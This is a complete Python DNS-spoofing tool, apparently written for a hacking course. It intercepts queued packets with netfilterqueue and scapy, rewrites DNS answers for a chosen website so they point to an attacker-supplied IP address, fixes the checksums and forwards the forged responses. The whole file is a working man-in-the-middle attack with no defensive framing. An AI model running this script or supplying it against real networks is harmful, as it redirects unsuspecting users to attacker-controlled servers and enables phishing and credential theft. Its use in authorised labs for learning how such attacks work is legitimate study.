#!/usr/bin/env python
import netfilterqueue
import scapy.all as scapy
import optparse


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-w", "--website", dest="website", help="Website to spoof")
    parser.add_option("-i", "--ip", dest="ip", help="IP address of spoofing machine")
    (options, arguments) = parser.parse_args()
    if not options.website:
        parser.error("[-] Please specify a Website, use --help for more info.")
    elif not options.ip:
        parser.error("[-] Please specify an IP Address, use --help for more info.")
    return options


def process_packet(packet):  # packet sniffed in the queue
    opts = get_arguments()
    website = opts.website
    spoofing_ip = opts.ip
    scapy_packet = scapy.IP(packet.get_payload())
    # check if the packet contains a DNS response
    if scapy_packet.haslayer(scapy.DNSRR):  # RR for response
        qname = scapy_packet[scapy.DNSQR].qname   # QR for question/request
        # check if the question that cause this response is a domain we want to target
        if website in qname.decode():  # decode() for python 3 compatibility
            print("[+] Spoofing target")
            # create a spoof answer
            answer = scapy.DNSRR(rrname=qname, rdata=spoofing_ip)
            # modify the scapy packet so that it uses the spoof answer
            scapy_packet[scapy.DNS].an = answer  # change the original A response/answer with our data
            # modify some field to make sure the answer is not corrupt
            scapy_packet[scapy.DNS].ancount = 1  # modify this field to match the responses that we are going to send
            # delete these layers/fields so that scapy recalculates based on the answer we send
            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum
            packet.set_payload(bytes(scapy_packet)) # str() for python 2
    packet.accept()  # forward the packet to the target


queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()
